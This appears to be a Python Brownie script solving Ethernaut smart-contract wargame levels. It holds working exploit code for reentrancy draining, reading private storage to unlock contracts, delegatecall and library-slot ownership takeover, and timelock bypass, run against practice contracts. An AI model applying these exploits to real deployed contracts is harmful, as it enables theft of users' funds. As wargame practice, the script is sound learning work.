import os
import time

from brownie import AttackForce, Vault, King, AttackKing, Reentrance, AttackReentrancy, Elevator, AttackElevator, Privacy, Recovery
from brownie import Fallback, Fallout, CoinFlip, CoinFlipAttacker, Telephone, TelephoneAttacker, TokenThing, Delegation, Delegate, Force
from brownie import NaughtCoin, Preservation, AttackPreservation, SimpleToken, MagicNum
from brownie import Wei, AttackPrivacy, GatekeeperOne, AttackGatekeeperOne, GatekeeperTwo, AttackGatekeeperTwo
from brownie import network, config, accounts, Contract

from web3 import Web3

from scripts.attackers import attack_fallback, attack_fallout, attack_token
from scripts.interface import get_account, deploy_contract, deploy_mocks, LOCAL_BLOCKCHAIN_ENVIRONMENTS, FORKED_LOCAL_ENVIRONMENTS


def deploy_fallback():
    account = get_account()
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        # if deploying locally, we want to use another account, so we can try to escalate privs
        fall_back = Fallback.deploy({"from": accounts[1]}, publish_source=False)
    else:
        fall_back_addr = config["networks"][network.show_active()]["fallBack_address"]
        fall_back = Contract.from_abi("Fallback", fall_back_addr, Fallback.abi)

    print(f"Fallback deployed to {fall_back.address}")
    # now we attack
    attack_fallback(fall_back, account)


def deploy_fallout():
    account = get_account()
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        # if deploying locally, we want to use another account, so we can try to escalate privs
        fall_out = Fallout.deploy({"from": accounts[1]}, publish_source=False)
    else:
        fall_out_address = config["networks"][network.show_active()]["fallOut_address"]
        fall_out = Contract.from_abi("Fallout", fall_out_address, Fallout.abi)

    print(f"Fallout deployed to {fall_out.address}")
    # now we attack
    attack_fallout(fall_out, account)


def deploy_coinflip():
    account = get_account()
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        coin_flip = CoinFlip.deploy({"from": account}, publish_source=False)
    else:
        coin_flip_address = config["networks"][network.show_active()]["coin_flip_address"]
        coin_flip = Contract.from_abi("CoinFlip", coin_flip_address, CoinFlip.abi)

    attacker = CoinFlipAttacker.deploy(coin_flip.address, {"from": account}, publish_source=False)
    # network.gas_limit(6700000)
    for x in range(0, 10):
        attacker.guessFlip({"from": account}).wait(1)
        # for the life of me I could not figure out why it reverts as "gas estimation failed" on the 2nd iteration of guessFlip
        # testing with brownie console showed that it works fine when waiting for 10 seconds each iteration
        time.sleep(10)
    # attacker.tenGuesses()
    print("CoinFlip attacked! Try submitting the solution as complete.")


def deploy_telephone():
    account = get_account()
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        telephone = Telephone.deploy({"from": accounts[1]}, publish_source=False)
    else:
        telephone_address = config["networks"][network.show_active()]["telephone_address"]
        telephone = Contract.from_abi("Telephone", telephone_address, Telephone.abi)

    print(f"Before the attack...are we owner? {telephone.owner() == account.address}")
    attacker = TelephoneAttacker.deploy(telephone.address, {"from": account}, publish_source=False)
    print(f"After the attack...are we owner? {telephone.owner() == account.address}")
    print("Telephone attacked! Try submitting the solution as complete.")


def deploy_token():
    account = get_account()
    init_supply = ["100"]
    token = deploy_contract(TokenThing, "token_thing", 1, init_supply)
    deployer_account = config["networks"][network.show_active()].get("token_think_deployer")

    # this challenge gave me the opportunity to learn how to fork
    # we can test out stealing arbitrary wallets
    if network.show_active() in FORKED_LOCAL_ENVIRONMENTS:
        # if forked, set account as the 'player' address, which should already have 20 tokens
        token_player_address = config["networks"][network.show_active()]["TokenThing_fork_wallet"]
        account = accounts.at(token_player_address, force=True)
    elif network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        # if local, give ourselves 20 tokens to mirror the ethernaut site
        token.transfer(account.address, 20)
        deployer_account = accounts[1]

    attack_token(token, account, deployer_account)


def deploy_delegation():
    account = get_account()
    delegation = deploy_contract(Delegation, "delegation", 1, [])

    data_to_send = Web3.keccak(text="pwn()").hex()
    print(f"Before the attack...are we owner of delegation? {delegation.owner() == account.address}")
    account.transfer(delegation.address, amount="0 ether", data=data_to_send).wait(1)
    print(f"After the attack...are we owner of delegation? {delegation.owner() == account.address}")


def deploy_force():
    account = get_account()
    force = deploy_contract(Force, "force", 1, [])

    attack_force = AttackForce.deploy({"from": account, "value": 100000}, publish_source=False)
    attack_force.attack(force.address, {"from": account})
    print("Force attacked! Try submitting the solution as complete.", force.balance())


def deploy_vault():
    account = get_account()
    vault = deploy_contract(Vault, "vault", 1, [bytes("testpassword", encoding='utf8')])

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        w3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))
    else:
        w3 = Web3(Web3.HTTPProvider(f"https://{network.show_active()}.infura.io/v3/{os.getenv('WEB3_INFURA_PROJECT_ID')}"))

    print(f"Connected? {w3.isConnected()}")
    password = w3.eth.get_storage_at(vault.address, 1)  # get 2nd variable
    password_decode = password.decode("utf-8")
    print(f"Password found: {password_decode}")
    vault.unlock(password, {"from": account}).wait(1)
    print(f"Locked? {vault.locked()}")
    print("Vault attacked! Try submitting the solution as complete.")


def deploy_king():
    account = get_account()
    king = deploy_contract(King, "King", 1, [])

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        king = King.deploy({"from": accounts[1].address, "value": 1}, publish_source=False)

    print(f"Before attack...Current prize: {king.prize()} King: {king._king()}")
    attackKing = AttackKing.deploy(king.address, {"from": account, "value": king.prize() + 2}, publish_source=False)
    print(f"After attack...Current prize: {king.prize()} Are we owner?: {king._king() == attackKing.address}")
    # confirm that the attack was successful
    try:
        king.transfer(account.address, king.prize() + 2).wait(1)
        print("King attacked but failed to break the game...")
    except:
        print("King attacked successfully! Submit the solution as complete.")


def deploy_re_entrance():
    account = get_account()
    re_entrance = deploy_contract(Reentrance, "Reentrance", 1, [])

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        # accounts[1] and accounts[2] each donates 1 ether to victim contract
        re_entrance.donate(account.address, {"from": accounts[1], "value": Wei("0.0001 ether")})
        re_entrance.donate(account.address, {"from": accounts[2], "value": Wei("0.0001 ether")})
        web3 = Web3(Web3.HTTPProvider("HTTP://127.0.0.1:8545"))
    else:
        web3 = Web3(Web3.HTTPProvider(f"https://{network.show_active()}.infura.io/v3/{os.getenv('WEB3_INFURA_PROJECT_ID')}"))

    # attacker gets deployed (in local and testnet)
    # accounts[0] deposits 1 ether into attacker
    attacker = AttackReentrancy.deploy(re_entrance.address, {"from": account.address, "value": Wei("0.0001 ether")}, publish_source=False)

    print(f"Before attack...victim balance: {web3.fromWei(web3.eth.get_balance(re_entrance.address), 'ether')}, attacker balance: {web3.fromWei(web3.eth.get_balance(attacker.address), 'ether')}")
    attacker.donateToTarget({"from": account.address}).wait(1)
    attacker.attack({"from": account.address}).wait(1)
    print(f"After attack...victim balance: {web3.fromWei(web3.eth.get_balance(re_entrance.address), 'ether')}, attacker balance: {web3.fromWei(web3.eth.get_balance(attacker.address), 'ether')}")
    print(f"After attack...recursion count: {attacker.recursionCount()}")


def deploy_elevator():
    account = get_account()
    elevator = deploy_contract(Elevator, "Elevator", 1, [])

    attacker = AttackElevator.deploy(elevator.address, {"from": account.address}, publish_source=False)

    print(f"Before the attack...top: {elevator.top()}, floor: {elevator.floor()}")
    attacker.attack({"from": account.address}).wait(1)
    print(f"After the attack...top: {elevator.top()}, floor: {elevator.floor()}")


def deploy_privacy():
    account = get_account()

    privacy = deploy_contract(Privacy, "Privacy", 1, [])
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        print("Use forked!")
        return

    w3 = Web3(Web3.HTTPProvider(f"https://goerli.infura.io/v3/{os.getenv('WEB3_INFURA_PROJECT_ID')}"))

    print(f"Connected? {w3.isConnected()}")
    print(f"Privacy contract address: {privacy.address}")
    _dataArray = w3.eth.get_storage_at(privacy.address, 5)  # get 6th variable

    # let's see all the memory slots (variables) for sanity
    for i in range(0, 6):
        print(f"Slot {i}: {w3.eth.get_storage_at(privacy.address, i)}")

    print(f"before attack...is locked?: {privacy.locked()}")
    # _dataArray has our key within the highest-order bits since the EVM is little-endian
    # instead of trying to convert a bytes32 to bytes16 in python we can just do it with another contract
    attack_privacy = AttackPrivacy.deploy(privacy.address, {"from": account.address}, publish_source=False)
    attack_privacy.unlock(_dataArray, {"from": account.address}).wait(1)
    print(f"after attack...locked?: {privacy.locked()}")


def deploy_gatekeeper_one():
    account = get_account()
    # we use deploy_contract when it doesn't get deployed if an address is specified in the config
    gatekeeper_one = deploy_contract(GatekeeperOne, "GatekeeperOne", 1, [])
    accaddr = account.address
    u16 = accaddr[-4:]
    u32 = u16.zfill(8)
    u64 = ("1" + u32).zfill(16)
    att = AttackGatekeeperOne.deploy(gatekeeper_one.address, {"from": accounts[0].address,"gas":1000000,"priority_fee":"5 gwei"})
    att.enter(u64)


def deploy_gatekeeper_two():
    account = get_account()
    gatekeeper_two = deploy_contract(GatekeeperTwo, "GatekeeperTwo", 1, [])
    print(f"Before attack...entrant: {gatekeeper_two.entrant()}")
    attacker = AttackGatekeeperTwo.deploy(gatekeeper_two.address, {"from": account.address, "gas_limit": 1000000,
                                          "gas_price": 100000, "allow_revert": True}, publish_source=False)
    print(f"After attack...entrant: {gatekeeper_two.entrant()}")


def deploy_naught_coin():
    account = get_account()
    naught_coin = deploy_contract(NaughtCoin, "NaughtCoin", 0, [account.address])

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        print(f"Victim balance: {naught_coin.balanceOf(account.address)}")
        print(f"Attacker balance: {naught_coin.balanceOf(accounts[1].address)}")
        naught_coin.approve(accounts[1].address, naught_coin.balanceOf(account.address)).wait(1)
        print(f"Allowance: {naught_coin.allowance(account.address, accounts[1].address)}")
        naught_coin.transferFrom(account.address, accounts[1].address, naught_coin.balanceOf(account.address), {"from": accounts[1].address}).wait(1)
        print(f"Victim balance: {naught_coin.balanceOf(account.address)}")
        print(f"Attacker balance: {naught_coin.balanceOf(accounts[1].address)}")
    else:
        # we'll just drain the contract into a random wallet from etherscan
        random_address = '0x7ffC57839B00206D1ad20c69A1981b489f772031'
        print(f"Balance: {naught_coin.balanceOf(account.address)}")
        naught_coin.approve(account.address, naught_coin.balanceOf(account.address), {"from": account.address}).wait(1)
        print(f"Allowance: {naught_coin.allowance(account.address, account.address)}")
        naught_coin.transferFrom(account.address, random_address, naught_coin.balanceOf(account.address), {"from": account.address}).wait(1)
        print(f"After attack...Balance: {naught_coin.balanceOf(account.address)}")


def deploy_preservation():
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        print("This test is for fork/testnet use only. I don't feel like deploying manually.")
        return

    account = get_account()

    attacker = AttackPreservation.deploy({"from": account.address}, publish_source=False)
    preservation = deploy_contract(Preservation, "Preservation", 1, [])
    print(f"Owner: {preservation.owner()}")

    # the first setFirstTime call will set the attacker contract as the timezoneOne library
    preservation.setFirstTime(attacker.address, {"from": account.address}).wait(1)

    # the second setFirstTime call will call the attacker's setTime which will set the owner as msg.sender
    preservation.setFirstTime(attacker.address, {"from": account.address}).wait(1)
    print(f"After attack...Owner: {preservation.owner()}")


def deploy_recovery():
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        print("This test is for fork/testnet use only. I don't feel like deploying manually.")
        return

    account = get_account()
    recovery = deploy_contract(Recovery, "Recovery", 1, [])

    w3 = Web3(Web3.HTTPProvider(f"https://rinkeby.infura.io/v3/{os.getenv('WEB3_INFURA_PROJECT_ID')}"))
    print("Connected: " + str(w3.isConnected()))

    # We are initially given the instance address of the Recovery contract
    # The SimpleToken contract was deployed within the Recovery contract
    # ,so we use the Recovery instance address to calculate the first deployed contract by setting the nonce to 1

    simple_token_contract_address = get_contract_address(recovery.address, 1)  # we're setting nonce (the # of transactions that came from the address that deployed the contract) as 1
    print(simple_token_contract_address)
    simple_token_instance = Contract.from_abi("SimpleToken", simple_token_contract_address, SimpleToken.abi)

    # now we call the function destroy() function to withdraw the 0.001 Ether
    print(f"Before attack...victim balance: {w3.fromWei(w3.eth.get_balance(simple_token_instance.address), 'ether')}, attacker balance: {w3.fromWei(w3.eth.get_balance(account.address), 'ether')}")
    simple_token_instance.destroy(account.address, {"from": account.address}).wait(1)

    # note: in fork this 'after balance' won't reflect the hack since it's getting the balance from the rinkeby branch, not your fork
    print(f"After attack...victim balance: {w3.fromWei(w3.eth.get_balance(simple_token_instance.address), 'ether')}, attacker balance: {w3.fromWei(w3.eth.get_balance(account.address), 'ether')}")


def deploy_magic_number():
    final_bytecode = "0x600a600c602039600a6020f3602a60005260206000f3"
    account = get_account()

    # first we must deploy our bytecode
    bytecode_tx_receipt = account.transfer(None, 0, None, None, None, None, None, final_bytecode, )
    bytecode_instance = bytecode_tx_receipt.contract_address
    print(bytecode_instance)

    magic_number_instance = deploy_contract(MagicNum, "MagicNum", 1, [])

    magic_number_instance.setSolver(bytecode_instance, {'from': account.address})
